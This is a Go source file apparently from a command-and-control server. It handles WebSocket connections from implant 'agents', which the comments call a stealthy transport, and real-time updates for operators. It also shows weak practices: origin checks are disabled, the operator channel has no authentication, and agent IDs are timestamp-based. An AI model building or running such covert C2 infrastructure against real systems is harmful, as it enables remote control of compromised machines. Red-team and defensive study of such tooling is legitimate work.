package server

import (
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

// WebSocketListener handles WebSocket-based C2 transport for agents.
// This provides an alternative to HTTP beacons for stealthy communication.
type WebSocketListener struct {
	server   *Server
	upgrader websocket.Upgrader
	mu       sync.Mutex
	sessions map[string]*WSOperatorSession
}

// WSOperatorSession tracks an operator's WebSocket session.
type WSOperatorSession struct {
	Conn      *websocket.Conn
	UserID    string
	Page      string
	AgentView string
	LastSeen  time.Time
}

var wsListener *WebSocketListener

// InitWebSocketListener initializes the WebSocket listener.
func InitWebSocketListener(s *Server) *WebSocketListener {
	wsListener = &WebSocketListener{
		server: s,
		upgrader: websocket.Upgrader{
			ReadBufferSize:  4096,
			WriteBufferSize: 4096,
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
		sessions: make(map[string]*WSOperatorSession),
	}
	return wsListener
}

// handleAgentWS handles agent WebSocket connections for C2 transport.
func (wl *WebSocketListener) handleAgentWS(c *gin.Context) {
	conn, err := wl.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Agent WS upgrade failed", "error", err)
		return
	}

	agentID := c.Query("agent_id")
	if agentID == "" {
		agentID = generateAgentID()
	}

	slog.Info("Agent WS connected", "agent_id", agentID)

	// Register with the beacon hub
	beacon := &WebSocketBeacon{
		Conn:       conn,
		AgentID:    agentID,
		LastSeen:   time.Now(),
		Send:       make(chan []byte, 256),
		BatchQueue: make([][]byte, 0, 16),
		compress:   true,
	}

	if wl.server.wsHub == nil {
		wl.server.wsHub = NewWebSocketHub()
	}
	wl.server.wsHub.Register(agentID, beacon)

	// Start pumps
	go wl.server.wsWritePump(beacon)
	go wl.agentReadPump(beacon)
}

// agentReadPump reads messages from an agent WebSocket connection.
func (wl *WebSocketListener) agentReadPump(beacon *WebSocketBeacon) {
	defer func() {
		wl.server.wsHub.Unregister(beacon.AgentID)
		beacon.Conn.Close()
	}()

	beacon.Conn.SetReadLimit(512 * 1024)
	beacon.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	beacon.Conn.SetPongHandler(func(string) error {
		beacon.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		beacon.LastSeen = time.Now()
		return nil
	})

	for {
		_, message, err := beacon.Conn.ReadMessage()
		if err != nil {
			break
		}

		// Process beacon request
		var req beaconRequest
		if err := json.Unmarshal(message, &req); err != nil {
			continue
		}

		req.UUID = beacon.AgentID
		resp := wl.server.processBeacon(req, "")

		respJSON, err := json.Marshal(resp)
		if err != nil {
			continue
		}

		select {
		case beacon.Send <- respJSON:
		default:
			slog.Warn("Agent WS send channel full", "agent_id", beacon.AgentID)
		}
	}
}

// handleOperatorWS handles operator WebSocket connections for real-time updates.
func (wl *WebSocketListener) handleOperatorWS(c *gin.Context) {
	conn, err := wl.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Operator WS upgrade failed", "error", err)
		return
	}

	userID := c.Query("user_id")
	if userID == "" {
		userID = "anonymous"
	}

	session := &WSOperatorSession{
		Conn:     conn,
		UserID:   userID,
		LastSeen: time.Now(),
	}

	wl.mu.Lock()
	wl.sessions[userID] = session
	wl.mu.Unlock()

	defer func() {
		wl.mu.Lock()
		delete(wl.sessions, userID)
		wl.mu.Unlock()
		conn.Close()
	}()

	// Read loop
	for {
		var msg map[string]interface{}
		if err := conn.ReadJSON(&msg); err != nil {
			break
		}

		msgType, _ := msg["type"].(string)
		switch msgType {
		case "page_update":
			if page, ok := msg["page"].(string); ok {
				session.Page = page
			}
		case "agent_view":
			if agentID, ok := msg["agent_id"].(string); ok {
				session.AgentView = agentID
			}
		case "ping":
			conn.WriteJSON(map[string]string{"type": "pong"})
		}
	}
}

// BroadcastToOperators sends a message to all connected operator sessions.
func (wl *WebSocketListener) BroadcastToOperators(msg []byte) {
	wl.mu.Lock()
	defer wl.mu.Unlock()

	for _, session := range wl.sessions {
		session.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := session.Conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			slog.Debug("Failed to send to operator", "user", session.UserID, "error", err)
		}
	}
}

// generateAgentID generates a unique agent ID.
func generateAgentID() string {
	return "ws_" + time.Now().Format("20060102150405")
}

// RegisterWSRoutes registers WebSocket transport routes.
func (s *Server) RegisterWSRoutes(r *gin.RouterGroup) {
	listener := InitWebSocketListener(s)
	r.GET("/ws/agent", listener.handleAgentWS)
	r.GET("/ws/operator", listener.handleOperatorWS)
}
